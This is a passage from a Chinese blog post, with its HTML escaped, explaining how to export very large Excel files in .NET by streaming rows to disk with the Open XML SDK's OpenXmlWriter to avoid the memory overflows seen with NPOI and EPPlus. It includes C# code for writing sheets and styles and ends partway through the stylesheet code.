&lt;p&gt;的确内存溢出了，但内存还剩下好几个G的，就会溢出，我用 .NET做的网站，开发的时候Host应该是Visual Studio安装的IIS Express, 应该是VS本身的限制，不过在网上查阅资料也没发现这的确也是困扰一些人的，也没查到什么结果，好在还有Google, 跃过墙外，在Stack Overflow上查到资料： &lt;strong&gt;OpenXML&lt;/strong&gt; , 这不是什么新技:  Office 2007在设计的时候, 为了更好的和其它应用程序交互，使用了XML + ZIP技术来实现excel, world, PPT等组件的本地保存, 我们所使用xlsx, dox, pptx文件本质上就一个ZIP压缩包，包内是组织好的XML文件，也就是说，我们可以通过生成, 修改, 生成合规的XML文件，再压缩成ZIP包，这就是一个可以被Office识别的文件了。&lt;/p&gt;
&lt;p&gt;用图说话：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/204983/201801/204983-20180114125700644-168293098.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/204983/201801/204983-20180114125706676-1746623323.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/204983/201801/204983-20180114125724832-1865745498.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;



&lt;p&gt;在园子里其实也有不少人介绍过 Open XML， 我想就多一个视角来介绍Open XML吧，好像也有很长时间没人写关于这个博文。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;什么是Office Open XML?&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;我们来看下维基百科的定义：&lt;/p&gt;
&lt;p&gt;Office Open XML (also informally known as OOXML or Microsoft Open XML (MOX)[2) is a zipped, XML-based file format developed by Microsoft[3] for representing spreadsheets, charts, presentations and word processing documents. The format was initially standardized by Ecma (as ECMA-376), and by the ISO and IEC (as ISO/IEC 29500) in later versions.&lt;/p&gt;
&lt;p&gt;Starting with Microsoft Office 2007, the Office Open XML file formats have become the default[4] target file format of Microsoft Office.[5][6] Microsoft Office 2010 provides read support for ECMA-376, read/write support for ISO/IEC 29500 Transitional, and read support for ISO/IEC 29500 Strict.[7] Microsoft Office 2013 and Microsoft Office 2016 additionally support both reading and writing of ISO/IEC 29500 Strict.[8]re&lt;/p&gt;
&lt;p&gt;refer: &lt;a href=&quot;https://en.wikipedia.org/wiki/Office_Open_XML&quot;&gt;https://en.wikipedia.org/wiki/Office_Open_XML&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;从Office 2007开始，就开始使用XML文件格式作为Microsoft Office的默认保存方式，其实我们通常用的NPOI  office 2007部分和EPPlus就是使用Open XML来开发的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;为什么同是使用Open XML， NPOI和EPPLus会出现内存溢出的问题？&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 这两个开源组件有对Office套件有着很全面的支持，它们会把数据加载到内存中一次性处理，如果碰到数据量过大，就很可能 遇到这个问题，网上EPPlus在20多万条数据的就溢出了，NPOI在11多万的时候就会溢出， 这个是和数据的列数和内容有关系，不管怎样，我们以后可能是会碰到这种大量数据的EXCEL导出，我们不需要很复杂的功能，就是想要导出一个EXCEL列表，这其实是可以做到的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;Open XML怎样做不会内存溢出？&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;NPOI和EPPlus在导出大量数据 的Excel列表时可能 会发生内存溢出的问题，原因是它们都把数据保存在内存中，因为它们支持各种复杂的功能，那么简单的列表，就是数量超大，我们把它通过文件流写入磁盘，这个问题就解决了。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;如何使用OPEN XML?&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;我们需要去微软官网下载OFFICE OPEN XML的SDK，链接: &lt;a href=&quot;https://www.microsoft.com/en-hk/download/details.aspx?id=30425&quot;&gt;https://www.microsoft.com/en-hk/download/details.aspx?id=30425&lt;/a&gt;，推荐使用NuGet在VISULAL STUDIO直接将引用添加到Project。&lt;/p&gt;
&lt;p&gt;在GitHub还有一些示例代码：&lt;a href=&quot;https://github.com/OfficeDev/Open-XML-SDK&quot; target=&quot;_blank&quot;&gt;https://github.com/OfficeDev/Open-XML-SDK&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;代码实现&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;说了这么多废话，我们看如何用OPEN XML实现一个EXCEL列表的导出:&lt;/p&gt;
&lt;p&gt;从原理上讲就是用OpenXML一个一个把标签写入本地磁盘。&lt;/p&gt;
&lt;p&gt;我截取我写的导出类的几个方法来来解释:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 指定磁盘路径初始化OpenWorkDoucment
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;fileName&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; OpenWorkDocument(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; fileName)
{
     document &lt;/span&gt;=&lt;span&gt; SpreadsheetDocument.Create(fileName, SpreadsheetDocumentType.Workbook);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;86&quot;&gt;
&lt;pre&gt;
///&amp;lt;summary&amp;gt;&lt;br/&gt;///&lt;span&gt;用datatable作为数据源，实际情况可以根据需要调整&lt;/span&gt;&lt;br/&gt;///&amp;lt;/summary&amp;gt;&lt;br/&gt;public &lt;span&gt;void&lt;/span&gt; AddSheet(DataTable dt, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; sheetName)&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;span&gt;        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (dt == &lt;span&gt;null&lt;/span&gt; || dt.Rows.Count == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ArgumentNullException(nameof(dt), &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;data source can not be null&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (document == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ArgumentNullException(nameof(document), &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;please init document first&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }


            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;this list of attributes will be used when writing a start element&lt;/span&gt;
            List&amp;lt;OpenXmlAttribute&amp;gt;&lt;span&gt; attributes;&lt;br/&gt;　　　　　　　&lt;span&gt;//这是我们为什么不会溢出的关键点, 使用XmlWriter写入磁盘&lt;/span&gt;
            OpenXmlWriter writer;  

            WorksheetPart workSheetPart &lt;/span&gt;= document.WorkbookPart.AddNewPart&amp;lt;WorksheetPart&amp;gt;&lt;span&gt;();
            writer &lt;/span&gt;=&lt;span&gt; OpenXmlWriter.Create(workSheetPart);&lt;br/&gt;　　　       &lt;span&gt;//使用OpenXML麻烦的地方就是我们要用SDK去拼接XML内容&lt;/span&gt;
            writer.WriteStartElement(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Worksheet());
            writer.WriteStartElement(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; SheetViews()); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;sheetViews&lt;/span&gt;
            writer.WriteStartElement(&lt;span&gt;new&lt;/span&gt; SheetView() &lt;span&gt;//&lt;/span&gt;&lt;span&gt;sheetView&lt;/span&gt;
&lt;span&gt;            {
                TabSelected &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;,
                WorkbookViewId &lt;/span&gt;= &lt;span&gt;0U  &lt;span&gt;//这里的下标是从0开始的&lt;/span&gt;&lt;/span&gt;&lt;span&gt;
            });
　　　　　　　&lt;span&gt; //这里是冻结列头，别问为什么是A2，我试了A1不行&lt;/span&gt;
            Pane pane &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Pane()
            {
                State &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; EnumValue&amp;lt;PaneStateValues&amp;gt;&lt;span&gt;(PaneStateValues.Frozen),
                VerticalSplit &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; DoubleValue((&lt;span&gt;double&lt;/span&gt;)&lt;span&gt;1&lt;/span&gt;&lt;span&gt;),
                TopLeftCell &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; StringValue(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;A2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;),
                ActivePane &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; EnumValue&amp;lt;PaneValues&amp;gt;&lt;span&gt;(PaneValues.BottomLeft)
            };
　　　　　　　&lt;span&gt;//对于一些文档本身的结构的描述，我们可以直接把准备属性设置正确，直接写入，因为描述实例很占用资源小，当然我们也可以把描述结点的子节点，子子节点都通过WriteStartElememt写入，不过很麻烦，容易出错&lt;/span&gt;
            writer.WriteStartElement(pane); &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Pane&lt;/span&gt;
            writer.WriteEndElement();   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;Pane&lt;/span&gt;
            writer.WriteStartElement(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Selection()
            {
                Pane &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; EnumValue&amp;lt;PaneValues&amp;gt;&lt;span&gt;(PaneValues.BottomLeft)
            });
            writer.WriteEndElement();   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Selection 关闭标签&lt;/span&gt;
            writer.WriteEndElement(); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;sheetView 关闭标签&lt;/span&gt;
            writer.WriteEndElement(); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;sheetViews 关闭标签&lt;/span&gt;
&lt;span&gt;

            writer.WriteStartElement(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; SheetData());
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; rowIndex = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (DataRow row &lt;span&gt;in&lt;/span&gt;&lt;span&gt; dt.Rows)
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;build header&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; (rowIndex == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
                {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;create a new list of attributes&lt;/span&gt;
                    attributes = &lt;span&gt;new&lt;/span&gt; List&amp;lt;OpenXmlAttribute&amp;gt;&lt;span&gt;();
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; add the row index attribute to the list&lt;/span&gt;
                    attributes.Add(&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;, (rowIndex + &lt;span&gt;1&lt;/span&gt;&lt;span&gt;).ToString()));
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;header start&lt;/span&gt;
                    writer.WriteStartElement(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Row(), attributes);
                    &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (DataColumn col &lt;span&gt;in&lt;/span&gt;&lt;span&gt; dt.Columns)
                    {
                        attributes &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; List&amp;lt;OpenXmlAttribute&amp;gt;&lt;span&gt;();
                        &lt;/span&gt;&lt;span&gt;//这里注意，在Excel在处理字符串的时候，会将所有的字符串保存到sharedStrings.xml, cell内写入在sharedString.XML的索引, 属性t(type)设置为s(str)&lt;/span&gt;&lt;span&gt;//我们在导出excel的时候把sharedString.mxl考虑进来会加大复杂程度，所以将t设置为str, 一个不存在的type, excel会直接解析cell内的字串值&lt;/span&gt;
                        attributes.Add(&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;t&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;str&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
                        &lt;/span&gt;&lt;span&gt;//通过s指定style样式的下标&lt;/span&gt;
                        attributes.Add(&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;, FORMAT_INDEX_HEADER.ToString()));&lt;br/&gt;&lt;span&gt;//能过r指定单元格位置，好像不是必需, 注意这里&lt;span&gt;&lt;strong&gt;下标位置是从1开始的&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;
                        attributes.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&quot;&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;.Format(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{0}{1}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, GetColumnName(col.Ordinal + &lt;span&gt;1&lt;/span&gt;), rowIndex + &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)));
                        writer.WriteStartElement(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Cell(), attributes);
                        writer.WriteElement(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; CellValue(col.ColumnName));
                        writer.WriteEndElement();

                    }
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;header end&lt;/span&gt;
&lt;span&gt;                    writer.WriteEndElement();
                    rowIndex&lt;/span&gt;++&lt;span&gt;;
                }

                &lt;/span&gt;&lt;span&gt;//数据写入，我们通过xmlWriter不会触发异常&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;create a new list of attributes&lt;/span&gt;
                attributes = &lt;span&gt;new&lt;/span&gt; List&amp;lt;OpenXmlAttribute&amp;gt;&lt;span&gt;();
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; add the row index attribute to the list&lt;/span&gt;
                attributes.Add(&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;, (rowIndex + &lt;span&gt;1&lt;/span&gt;&lt;span&gt;).ToString()));
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;header start&lt;/span&gt;
                writer.WriteStartElement(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Row(), attributes);
                &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (DataColumn col &lt;span&gt;in&lt;/span&gt;&lt;span&gt; dt.Columns)
                {
                    attributes &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; List&amp;lt;OpenXmlAttribute&amp;gt;&lt;span&gt;();

                    &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt; (col.DataType.ToString())
                    {
                        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;System.Int32&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                            attributes.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;, FORMAT_INDEX_INT.ToString()));
                            attributes.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;t&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;number&lt;/span&gt;
                            &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;System.Double&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;System.Decimal&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;System.Float&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                            attributes.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;, FORMAT_INDEX_DEC.ToString())); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;header style&lt;/span&gt;
                            attributes.Add(&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;t&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;number&lt;/span&gt;
                            &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                        &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt;:
                            attributes.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;, FORMAT_INDEX_STR.ToString())); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;header style&lt;/span&gt;
                            attributes.Add(&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;t&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;str&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;string&lt;/span&gt;
                            &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                    }
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;add the cell reference attribute&lt;/span&gt;
                    attributes.Add(&lt;span&gt;new&lt;/span&gt; OpenXmlAttribute(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;.Format(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{0}{1}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, GetColumnName(col.Ordinal + &lt;span&gt;1&lt;/span&gt;), rowIndex + &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)));
                    writer.WriteStartElement(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Cell(), attributes);
                    writer.WriteElement(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; CellValue(row[col.Ordinal].ToString()));
                    writer.WriteEndElement();
                }
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;header end&lt;/span&gt;
&lt;span&gt;                writer.WriteEndElement();

                rowIndex&lt;/span&gt;++&lt;span&gt;;
            }

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; End SheetData&lt;/span&gt;
&lt;span&gt;            writer.WriteEndElement();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; End Worksheet&lt;/span&gt;
&lt;span&gt;            writer.WriteEndElement();
            writer.Close();



            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (document.WorkbookPart.Workbook == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                document.WorkbookPart.Workbook &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Workbook();
                document.WorkbookPart.Workbook.Append(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Sheets());
            }
           &lt;span&gt; //数据写入完成后，注册一个sheet引用到workbook.xml, 也就是在excel最下面的sheet name
            &lt;/span&gt;&lt;/span&gt;&lt;span&gt;var&lt;/span&gt; sheet = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Sheet()
            {
                Name &lt;/span&gt;= !String.IsNullOrWhiteSpace(sheetName) ? sheetName : (&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Sheet &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + DateTime.Now.ToString(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ms&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)),
                SheetId &lt;/span&gt;= UInt32Value.FromUInt32((&lt;span&gt;uint&lt;/span&gt;)m_sheetIndex++&lt;span&gt;),
                Id &lt;/span&gt;=&lt;span&gt; document.WorkbookPart.GetIdOfPart(workSheetPart)
            };
            document.WorkbookPart.Workbook.Sheets.Append(sheet);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;79&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;生成Style样式, 注意下标从0开始, 依次加1, 如果有跳过1直接设置3这样情况, 可能无法正常解析到样式&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Stylesheet GenerateStylesheet()
        {
            Stylesheet styleSheet &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;

            Fonts fonts &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Fonts(
                &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Font( &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Index 0 - default&lt;/span&gt;
                    &lt;span&gt;new&lt;/span&gt; FontSize() { Val = &lt;span&gt;11&lt;/span&gt;&lt;span&gt; }

                ),
                &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Font( &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Index 1 - header&lt;/span&gt;
                    &lt;span&gt;new&lt;/span&gt; FontSize() { Val = &lt;span&gt;11&lt;/span&gt;&lt;span&gt; },
                    &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Bold(),
                    &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Color() { Rgb = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;FFFFFF&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; }

                ));

            Fills fills &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Fills(
                    &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Fill(&lt;span&gt;new&lt;/span&gt; PatternFill() { PatternType = PatternValues.None }), &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Index 0 - default&lt;/span&gt;
                    &lt;span&gt;new&lt;/span&gt; Fill(&lt;span&gt;new&lt;/span&gt; PatternFill() { PatternType = PatternValues.Gray125 }), &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Index 1 - default&lt;/span&gt;
                    &lt;span&gt;new&lt;/span&gt; Fill(&lt;span&gt;new&lt;/span&gt; PatternFill(&lt;span&gt;new&lt;/span&gt; ForegroundColor { Rgb = &lt;span&gt;new&lt;/span&gt; HexBinaryValue() { Value = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;0070c0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; } }) { PatternType =&lt;span&gt; PatternValues.Solid })
                );



            Borders borders &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Borders(
                    &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Border(), &lt;span&gt;//&lt;/span&gt;&lt;span&gt; index 0 default&lt;/span&gt;
                    &lt;span&gt;new&lt;/span&gt; Border( &lt;span&gt;//&lt;/span&gt;&lt;span&gt; index 1 black border&lt;/span&gt;
                        &lt;span&gt;new&lt;/span&gt; LeftBorder(&lt;span&gt;new&lt;/span&gt; Color() { Auto = &lt;span&gt;true&lt;/span&gt; }) { Style =&lt;span&gt; BorderStyleValues.Thin },
                        &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; RightBorder(&lt;span&gt;new&lt;/span&gt; Color() { Auto = &lt;span&gt;true&lt;/span&gt; }) { Style =&lt;span&gt; BorderStyleValues.Thin },
                        &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; TopBorder(&lt;span&gt;new&lt;/span&gt; Color() { Auto = &lt;span&gt;true&lt;/span&gt; }) { Style =&lt;span&gt; BorderStyleValues.Thin },
                        &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; BottomBorder(&lt;span&gt;new&lt;/span&gt; Color() { Auto = &lt;span&gt;true&lt;/span&gt; }) { Style =&lt;span&gt; BorderStyleValues.Thin },
                        &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; DiagonalBorder())
                );

            NumberingFormats numbers &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NumberingFormats(
                &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; NumberingFormat() { NumberFormatId = &lt;span&gt;0&lt;/span&gt;, FormatCode = &lt;span&gt;new&lt;/span&gt; StringValue(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#,##0.00&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) },
                &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; NumberingFormat() { NumberFormatId = &lt;span&gt;1&lt;/span&gt;, FormatCode = &lt;span&gt;new&lt;/span&gt; StringValue(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) }
                );


            CellFormats cellFormats &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; CellFormats(
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; default&lt;/span&gt;
                    &lt;span&gt;new&lt;/span&gt; CellFormat() { FormatId =&lt;span&gt; FORMAT_INDEX_DEFUALT },
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; body  string&lt;/span&gt;
                    &lt;span&gt;new&lt;/span&gt; CellFormat { FormatId = FORMAT_INDEX_STR, FontId = &lt;span&gt;0&lt;/span&gt;, FillId = &lt;span&gt;0&lt;/span&gt;, BorderId = &lt;span&gt;1&lt;/span&gt;, ApplyBorder = &lt;span&gt;true&lt;/span&gt;&lt;span&gt; },
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; body decimal&lt;/span&gt;
                    &lt;span&gt;new&lt;/span&gt; CellFormat { FormatId = FORMAT_INDEX_DEC, FontId = &lt;span&gt;0&lt;/span&gt;, FillId = &lt;span&gt;0&lt;/span&gt;, BorderId = &lt;span&gt;1&lt;/span&gt;, NumberFormatId = &lt;span&gt;0&lt;/span&gt;, ApplyBorder = &lt;span&gt;true&lt;/span&gt;&lt;span&gt; },
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;header&lt;/span&gt;
